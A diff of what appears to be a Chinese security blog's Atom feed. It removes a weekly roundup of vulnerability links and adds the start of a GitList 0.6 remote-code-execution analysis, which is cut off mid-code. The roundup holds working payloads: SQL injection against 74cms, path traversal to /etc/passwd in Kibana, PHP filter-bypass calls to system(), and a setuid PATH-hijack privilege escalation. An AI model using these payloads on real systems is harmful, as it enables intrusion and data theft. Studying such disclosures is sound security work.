@@ -241,122 +241,6 @@
   </entry>
   
   <entry>
-    <title>Security Weekly</title>
-    <link href="http://chybeta.github.io/2099/01/06/Security-Weekly/"/>
-    <id>http://chybeta.github.io/2099/01/06/Security-Weekly/</id>
-    <published>2099-01-06T00:33:02.000Z</published>
-    <updated>2019-01-06T00:55:46.162Z</updated>
-    
-    <content type="html"><![CDATA[<p>Security Weekly<br><a id="more"></a></p>
-<h1 id="2018-12-31-2019-01-06"><a href="#2018-12-31-2019-01-06" class="headerlink" title="2018/12/31-2019/01/06"></a>2018/12/31-2019/01/06</h1><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="1-phpmywind5-5代码审计"><a href="#1-phpmywind5-5代码审计" class="headerlink" title="1. phpmywind5.5代码审计"></a>1. phpmywind5.5代码审计</h3><p>文章：<a href="https://xz.aliyun.com/t/3730" target="_blank" rel="external">https://xz.aliyun.com/t/3730</a></p>
-<h3 id="2-74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#2-74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="2. 74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>2. 74cms v4.2.1-v4.2.129-后台getshell漏洞</h3><p>文章：<a href="https://xz.aliyun.com/t/3736" target="_blank" rel="external">https://xz.aliyun.com/t/3736</a></p>
-<h3 id="3-niushopCMS-前台Getshell"><a href="#3-niushopCMS-前台Getshell" class="headerlink" title="3. niushopCMS 前台Getshell"></a>3. niushopCMS 前台Getshell</h3><p>文章：<a href="https://xz.aliyun.com/t/3767" target="_blank" rel="external">https://xz.aliyun.com/t/3767</a></p>
-<h3 id="4-feifeicms-4-0-几处任意文件删除"><a href="#4-feifeicms-4-0-几处任意文件删除" class="headerlink" title="4. feifeicms 4.0 几处任意文件删除"></a>4. feifeicms 4.0 几处任意文件删除</h3><p>文章：<a href="https://xz.aliyun.com/t/3729" target="_blank" rel="external">https://xz.aliyun.com/t/3729</a></p>
-<h3 id="5-Windows-0day任意文件读取漏洞POC分析"><a href="#5-Windows-0day任意文件读取漏洞POC分析" class="headerlink" title="5. Windows 0day任意文件读取漏洞POC分析"></a>5. Windows 0day任意文件读取漏洞POC分析</h3><p>文章：<a href="https://www.freebuf.com/vuls/192876.html" target="_blank" rel="external">https://www.freebuf.com/vuls/192876.html</a></p>
-<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><h3 id="1-OSINT-Resources-for-2019"><a href="#1-OSINT-Resources-for-2019" class="headerlink" title="1. OSINT Resources for 2019"></a>1. OSINT Resources for 2019</h3><p>文章：<a href="https://xz.aliyun.com/t/3742" target="_blank" rel="external">https://xz.aliyun.com/t/3742</a></p>
-<h3 id="2-利用EXCEL进行XXE攻击"><a href="#2-利用EXCEL进行XXE攻击" class="headerlink" title="2. 利用EXCEL进行XXE攻击"></a>2. 利用EXCEL进行XXE攻击</h3><p>文章：<a href="https://xz.aliyun.com/t/3741" target="_blank" rel="external">https://xz.aliyun.com/t/3741</a></p>
-<h3 id="3-使用Burp-Suite-宏自动化处理-Session-会话"><a href="#3-使用Burp-Suite-宏自动化处理-Session-会话" class="headerlink" title="3. 使用Burp Suite 宏自动化处理 Session 会话"></a>3. 使用Burp Suite 宏自动化处理 Session 会话</h3><p>文章：<a href="https://xz.aliyun.com/t/3751" target="_blank" rel="external">https://xz.aliyun.com/t/3751</a></p>
-<h3 id="4-SpEL-injection"><a href="#4-SpEL-injection" class="headerlink" title="4. SpEL injection"></a>4. SpEL injection</h3><p>文章：<a href="https://cryin.github.io/blog/SpEL%20injection/" target="_blank" rel="external">https://cryin.github.io/blog/SpEL%20injection/</a></p>
-<h3 id="5-子域名接管：二阶漏洞利用"><a href="#5-子域名接管：二阶漏洞利用" class="headerlink" title="5. 子域名接管：二阶漏洞利用"></a>5. 子域名接管：二阶漏洞利用</h3><p>文章：<a href="http://www.4hou.com/web/15504.html" target="_blank" rel="external">http://www.4hou.com/web/15504.html</a></p>
-<h2 id="Bug-Bounty"><a href="#Bug-Bounty" class="headerlink" title="Bug Bounty"></a>Bug Bounty</h2><h3 id="1-在Philips-com中反射型xss"><a href="#1-在Philips-com中反射型xss" class="headerlink" title="1. 在Philips.com中反射型xss"></a>1. 在Philips.com中反射型xss</h3><p>文章：<a href="https://xz.aliyun.com/t/3739" target="_blank" rel="external">https://xz.aliyun.com/t/3739</a></p>
-<h3 id="3-用跨站搜索（XS-Search）在谷歌问题跟踪平台实现敏感信息获取"><a href="#3-用跨站搜索（XS-Search）在谷歌问题跟踪平台实现敏感信息获取" class="headerlink" title="3. 用跨站搜索（XS-Search）在谷歌问题跟踪平台实现敏感信息获取"></a>3. 用跨站搜索（XS-Search）在谷歌问题跟踪平台实现敏感信息获取</h3><p>文章：<a href="https://www.freebuf.com/articles/web/191336.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/191336.html</a></p>
-<h3 id="4-F12给了我黑色的眼睛我却用它来挖洞"><a href="#4-F12给了我黑色的眼睛我却用它来挖洞" class="headerlink" title="4. F12给了我黑色的眼睛我却用它来挖洞"></a>4. F12给了我黑色的眼睛我却用它来挖洞</h3><p>文章：<a href="https://www.freebuf.com/vuls/193146.html" target="_blank" rel="external">https://www.freebuf.com/vuls/193146.html</a></p>
-<h3 id="5-Reflected-XSS-on-ws-na-amazon-adsystem-com-Amazon"><a href="#5-Reflected-XSS-on-ws-na-amazon-adsystem-com-Amazon" class="headerlink" title="5. Reflected XSS on ws-na.amazon-adsystem.com(Amazon)"></a>5. Reflected XSS on ws-na.amazon-adsystem.com(Amazon)</h3><p>文章：<a href="https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf" target="_blank" rel="external">https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf</a></p>
-<h3 id="6-gem任意写入文件"><a href="#6-gem任意写入文件" class="headerlink" title="6. gem任意写入文件"></a>6. gem任意写入文件</h3><p>地址：<a href="https://hackerone.com/reports/270072" target="_blank" rel="external">https://hackerone.com/reports/270072</a></p>
-<h1 id="2018-12-23-2018-12-30"><a href="#2018-12-23-2018-12-30" class="headerlink" title="2018/12/23 - 2018/12/30"></a>2018/12/23 - 2018/12/30</h1><h2 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="1-gogs-gitea-RCE-CVE-2018-20303"><a href="#1-gogs-gitea-RCE-CVE-2018-20303" class="headerlink" title="1. gogs/gitea RCE CVE-2018-20303"></a>1. gogs/gitea RCE CVE-2018-20303</h3><p>文章：<a href="https://xz.aliyun.com/t/3725" target="_blank" rel="external">https://xz.aliyun.com/t/3725</a></p>
-<p>基本原理跨目录上传伪造的管理员session文件，覆盖当前的session文件，导致权限提升。最初的issue地址在 <a href="https://github.com/go-gitea/gitea/issues/5569" target="_blank" rel="external">https://github.com/go-gitea/gitea/issues/5569</a> ，在初步修复后被发现绕过方法见 <a href="https://github.com/gogs/gogs/commit/8c8c37a66b4cef6fc8a995ab1b4fd6e530c49c51" target="_blank" rel="external">https://github.com/gogs/gogs/commit/8c8c37a66b4cef6fc8a995ab1b4fd6e530c49c51</a> 。</p>
-<p>类似相关漏洞：<a href="https://xz.aliyun.com/t/3168" target="_blank" rel="external">GOGS/Gitea任意代码执行(CVE-2018-18925/6)及利用流程</a></p>
-<h3 id="2-74cms-前台注入"><a href="#2-74cms-前台注入" class="headerlink" title="2. 74cms 前台注入"></a>2. 74cms 前台注入</h3><p>文章：<a href="https://xz.aliyun.com/t/3714" target="_blank" rel="external">https://xz.aliyun.com/t/3714</a></p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;range=20&amp;lng=113.35038* PI() / 180 - map_x PI() / 180) / 2),2))) 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a</div></pre></td></tr></table></figure></p>
-<h3 id="3-empirecms-后台getshell"><a href="#3-empirecms-后台getshell" class="headerlink" title="3. empirecms 后台getshell"></a>3. empirecms 后台getshell</h3><p>文章：<a href="https://xz.aliyun.com/t/3667" target="_blank" rel="external">https://xz.aliyun.com/t/3667</a></p>
-<p>两处后台getshell，都是文件包含。第一处在导入系统模型处，第二处在自定义页面。</p>
-<h3 id="4-LearnX控件的漏洞挖掘过程"><a href="#4-LearnX控件的漏洞挖掘过程" class="headerlink" title="4. LearnX控件的漏洞挖掘过程"></a>4. LearnX控件的漏洞挖掘过程</h3><p>文章：<a href="https://xz.aliyun.com/t/3708" target="_blank" rel="external">https://xz.aliyun.com/t/3708</a></p>
-<p>利用了<code>COMRaider</code>工具fuzz。</p>
-<h3 id="5-Elasticsearch-核心插件Kibana-本地文件包含漏洞"><a href="#5-Elasticsearch-核心插件Kibana-本地文件包含漏洞" class="headerlink" title="5. Elasticsearch 核心插件Kibana 本地文件包含漏洞"></a>5. Elasticsearch 核心插件Kibana 本地文件包含漏洞</h3><p>文章：<a href="https://www.anquanke.com/post/id/168291" target="_blank" rel="external">https://www.anquanke.com/post/id/168291</a></p>
-<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</div></pre></td></tr></table></figure></p>
-<p>感觉鸡肋。需要登陆，包含<code>/etc/passwd</code>的话只会导致服务器错误，并不能读取内容。此外有文章说能RCE，但前提是要有上传<code>js</code>文件的点，然后再去包含这个<code>js</code>文件。</p>
-<h2 id="技巧-1"><a href="#技巧-1" class="headerlink" title="技巧"></a>技巧</h2><h3 id="1-利用Web应用中隐藏的文件夹和文件获取敏感信息"><a href="#1-利用Web应用中隐藏的文件夹和文件获取敏感信息" class="headerlink" title="1. 利用Web应用中隐藏的文件夹和文件获取敏感信息"></a>1. 利用Web应用中隐藏的文件夹和文件获取敏感信息</h3><p>文章：<a href="https://xz.aliyun.com/t/3677" target="_blank" rel="external">https://xz.aliyun.com/t/3677</a></p>
-<p>简单总结：</p>
-<ul>
-<li>源代码版本控制系统<ul>
-<li>git</li>
-<li>.gitignore</li>
-<li>svn</li>
-</ul>
-</li>
-<li>IDE (集成开发环境)配置文件<ul>
-<li>jetbrain全家桶</li>
-<li>netbeans</li>
-</ul>
-</li>
-<li>特定于项目和/或技术的配置和设置文件<ul>
-<li>nodejs项目的各种配置文件</li>
-<li>GitLab CI/CD .gitlab-ci.yml</li>
-<li>Ruby on Rails database.yml</li>
-<li>macOS .DS_Store</li>
-</ul>
-</li>
-</ul>
-<p>当然文章只总结了这么多，实际还有一大堆可能泄露的文件，按下不提。</p>
-<h3 id="2-如何绕过代码过滤和WAF规则远程执行PHP代码"><a href="#2-如何绕过代码过滤和WAF规则远程执行PHP代码" class="headerlink" title="2. 如何绕过代码过滤和WAF规则远程执行PHP代码"></a>2. 如何绕过代码过滤和WAF规则远程执行PHP代码</h3><p>文章：<a href="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf" target="_blank" rel="external">https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf</a></p>
-<p>简单小记：</p>
-<ul>
-<li>system(“cat /etc$u/passwd”)</li>
-<li>利用php字符串转换：<ul>
-<li>八进制<code>\[0–7]{1,3}</code></li>
-<li>十六进制<code>\x[0-9A-Fa-f]{1,2}</code></li>
-<li>unicode <code>\u{[0-9A-Fa-f]+}</code></li>
-</ul>
-</li>
-<li>php中的 <code>$var(args);</code>和<code>&quot;string&quot;(args);</code><ul>
-<li>system(“ls”) -&gt; “system”(“ls”) -&gt; “\x73\x79\x73\x74\x65\x6d”(“ls”)</li>
-</ul>
-</li>
-<li>利用<code>()</code>： “system”(“ls”)  -&gt; (system)(ls);</li>
-<li>字符串拼接：(sy.(st).em)(ls)</li>
-<li>注释：sys./<em>test</em>/.tem(ls)</li>
-<li>利用函数定义列表数组：get_defined_functions<ul>
-<li>第一步获取system的索引：get_defined_functions()[internal] | grep ‘system’</li>
-<li>第二步调用：get_defined_functions()[internal]<a href="ls">1000</a></li>
-</ul>
-</li>
-<li>字符数组，拼凑。</li>
-</ul>
-<h2 id="Bug-Bounty-1"><a href="#Bug-Bounty-1" class="headerlink" title="Bug Bounty"></a>Bug Bounty</h2><h3 id="1-利用条件竞争获取money"><a href="#1-利用条件竞争获取money" class="headerlink" title="1. 利用条件竞争获取money"></a>1. 利用条件竞争获取money</h3><p>案例：<a href="https://hackerone.com/reports/429026" target="_blank" rel="external">https://hackerone.com/reports/429026</a></p>
-<p>Burp截取请求，右键<code>Copy as curl command</code>。然后 <code>(request) &amp; (request) &amp; (request) 。。。</code></p>
-<h3 id="2-基于setuid为root的程序的提权漏洞"><a href="#2-基于setuid为root的程序的提权漏洞" class="headerlink" title="2. 基于setuid为root的程序的提权漏洞"></a>2. 基于setuid为root的程序的提权漏洞</h3><p>地址：<a href="https://hackerone.com/reports/426944" target="_blank" rel="external">https://hackerone.com/reports/426944</a></p>
-<p><code>keybase-redirector</code>的setuid为root权限。它通过<code>相对路径</code>来调用<code>fusermount</code>程序，同时对环境变量<code>$PATH</code>没做足够的验证。因此可以自己编写一个<code>fusermount.c</code>并编译出可执行文件<code>fusermount</code>，在环境变量中添加当前所在目录，利用<code>keybase-redirector</code>来执行伪造的<code>fusermount</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">env PATH=.:$PATH /usr/bin/keybase-redirector /keybase</div></pre></td></tr></table></figure></p>
-<h3 id="3-HOST头伪造"><a href="#3-HOST头伪造" class="headerlink" title="3. HOST头伪造"></a>3. HOST头伪造</h3><p>案例：重置密码邮件连接 <a href="https://lightningsecurity.io/blog/host-header-injection/" target="_blank" rel="external">https://lightningsecurity.io/blog/host-header-injection/</a></p>
-<p>一些网站提供了动态子域名，比如 a.com ，你可以申请到 xxx.a.com。在重置密码时，网站 a.com 为了确认是哪个用户发起的请求，直接采用了客户端提供的<code>HOST</code>头部。通过伪造<code>HOST</code>头部，比如 <code>Host: b.com</code> ，服务器将组装重置密码链接：<code>http://b.com?reset_token=12345</code> ，并发往用户邮箱。当用户点击时，<code>b.com</code>即可获取到<code>reset_token</code>。</p>
-<h3 id="4-缓存投毒导致DDOS"><a href="#4-缓存投毒导致DDOS" class="headerlink" title="4. 缓存投毒导致DDOS"></a>4. 缓存投毒导致DDOS</h3><p>案例：<a href="https://hackerone.com/reports/409370" target="_blank" rel="external">https://hackerone.com/reports/409370</a><br>相关知识：<a href="https://xz.aliyun.com/t/2585" target="_blank" rel="external">https://xz.aliyun.com/t/2585</a>  <a href="https://xz.aliyun.com/t/2877" target="_blank" rel="external">https://xz.aliyun.com/t/2877</a></p>
-<p>添加头部<code>X-Forwarded-Port: 123</code>或者<code>X-Forwarded-Host: www.hackerone.com:123</code>  利用缓存使用户被重定向从而DDOS</p>
-<h3 id="5-wordpress-xmlrpc-php文件导致DDOS或爆破"><a href="#5-wordpress-xmlrpc-php文件导致DDOS或爆破" class="headerlink" title="5. wordpress xmlrpc.php文件导致DDOS或爆破"></a>5. wordpress xmlrpc.php文件导致DDOS或爆破</h3><p>案例： <a href="https://hackerone.com/reports/448524" target="_blank" rel="external">https://hackerone.com/reports/448524</a></p>
-<p>当发现<code>xmlrpc.php</code>时可以发送以下请求包来列举方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /wp/xmlrpc.php HTTP/1.1</div><div class="line"></div><div class="line">&lt;methodCall&gt;</div><div class="line">&lt;methodName&gt;system.listMethods&lt;/methodName&gt;</div><div class="line">&lt;params&gt;&lt;/params&gt;</div><div class="line">&lt;/methodCall&gt;</div></pre></td></tr></table></figure></p>
-<p>如果获取到响应类似如下，说明xmlrpc启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;methodResponse&gt;</div><div class="line">&lt;params&gt;</div><div class="line">&lt;param&gt;</div><div class="line">&lt;value&gt;</div><div class="line">&lt;array&gt;&lt;data&gt;</div><div class="line">&lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;</div><div class="line">&lt;/data&gt;&lt;/array&gt;</div><div class="line">&lt;/value&gt;</div><div class="line">&lt;/param&gt;</div><div class="line">&lt;/params&gt;</div><div class="line">&lt;/methodResponse&gt;</div></pre></td></tr></table></figure></p>
-<p>其中利用如<code>pingback.ping</code>或 <code>trackbacks</code>可造成DDOS</p>
-<h3 id="6-利用ASP-NET的LFI漏洞读取ASP-Secrets"><a href="#6-利用ASP-NET的LFI漏洞读取ASP-Secrets" class="headerlink" title="6. 利用ASP.NET的LFI漏洞读取ASP Secrets"></a>6. 利用ASP.NET的LFI漏洞读取ASP Secrets</h3><p>文章：<a href="http://docs.ioin.in/writeup/www.anquanke.com/_post_id_168302/index.html" target="_blank" rel="external">http://docs.ioin.in/writeup/www.anquanke.com/_post_id_168302/index.html</a></p>
-<ol>
-<li><p>服务端有一定的过滤，利用fuzz来进行测试绕过。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /utility/download.aspx?f=.[fuzz]./utility/download.aspx</div></pre></td></tr></table></figure>
-</li>
-<li><p>通过读取 <code>.ashx</code>文件或<code>dll</code>文件来获取处理程序的真实源代码。</p>
-</li>
-<li>重要的配置文件：web.config </li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Security Weekly&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Security Weekly" scheme="http://chybeta.github.io/categories/Security-Weekly/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</title>
     <link href="http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/</id>
@@ -1423,9 +1307,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
       <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
     
@@ -1693,9 +1577,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="opentsdb" scheme="http://chybeta.github.io/tags/opentsdb/"/>
     
@@ -1757,9 +1641,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
     
@@ -1812,11 +1696,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
     
@@ -2035,9 +1919,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -2106,9 +1990,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
@@ -2172,13 +2056,73 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
       <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
     
       <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>GitList 0.6 Unauthenticated RCE 分析</title>
+    <link href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/</id>
+    <published>2018-04-30T04:25:26.000Z</published>
+    <updated>2018-05-01T12:14:53.244Z</updated>
+    
+    <content type="html"><![CDATA[<p>GitList 0.6 Unauthenticated RCE 分析<br><a id="more"></a></p>
+<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>Gitlist 0.6 下载地址： <a href="https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz" target="_blank" rel="external">https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz</a></p>
+<p>解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repositories[] = &apos;/home/chybeta/test/&apos;</div></pre></td></tr></table></figure></p>
+<p>在<code>test</code>目录下建立repo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir gitlist_rce</div><div class="line">cd gitlist_rce</div><div class="line">echo &quot;chybeta&quot; &gt; README.md</div><div class="line">git init</div><div class="line">git add *</div><div class="line">git commit -m &quot;gitlist_rce&quot;</div></pre></td></tr></table></figure></p>
+<p>其余问题，可以直接参考<a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/1.png?raw=true" alt=""></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 gitlist/src/Controller/TreeController.php:51行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">$route-&gt;post(<span class="string">'&#123;repo&#125;/tree/&#123;branch&#125;/search'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $repo, $branch = <span class="string">''</span>, $tree = <span class="string">''</span>)</span> <span class="title">use</span> <span class="params">($app)</span> </span>&#123;</div><div class="line">    $repository = $app[<span class="string">'git'</span>]-&gt;getRepositoryFromName($app[<span class="string">'git.repos'</span>], $repo);</div><div class="line">    <span class="keyword">if</span> (!$branch) &#123;</div><div class="line">        $branch = $repository-&gt;getHead();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $request-&gt;get(<span class="string">'query'</span>);</div><div class="line">    $breadcrumbs = [[<span class="string">'dir'</span> =&gt; <span class="string">'Search results for: '</span> . $query, <span class="string">'path'</span> =&gt; <span class="string">''</span>]];</div><div class="line">    $results = $repository-&gt;searchTree($query, $branch);</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>当我们在repo中进行搜索时，以搜索字符串”chybeta”为例<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/2.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1</div><div class="line"></div><div class="line">query=chybeta</div></pre></td></tr></table></figure>
+<p>则对应的变量即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">repo =&gt; gitlist_rce</div><div class="line">branch =&gt; master</div><div class="line">query =&gt; chybeta</div></pre></td></tr></table></figure></p>
+<p>进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $query = escapeshellarg($query);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p><code>query</code>参数经过了<code>escapeshellarg</code>函数的过滤，<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">官方文档</a>:</p>
+<blockquote>
+<p>escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符.</p>
+</blockquote>
+<p>之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($repository, $command)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (version_compare(<span class="keyword">$this</span>-&gt;getVersion(), <span class="string">'1.7.2'</span>, <span class="string">'&gt;='</span>)) &#123;</div><div class="line">        $command = <span class="string">'-c "color.ui"=false '</span> . $command;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $process = <span class="keyword">new</span> Process(<span class="keyword">$this</span>-&gt;getPath() . <span class="string">' '</span> 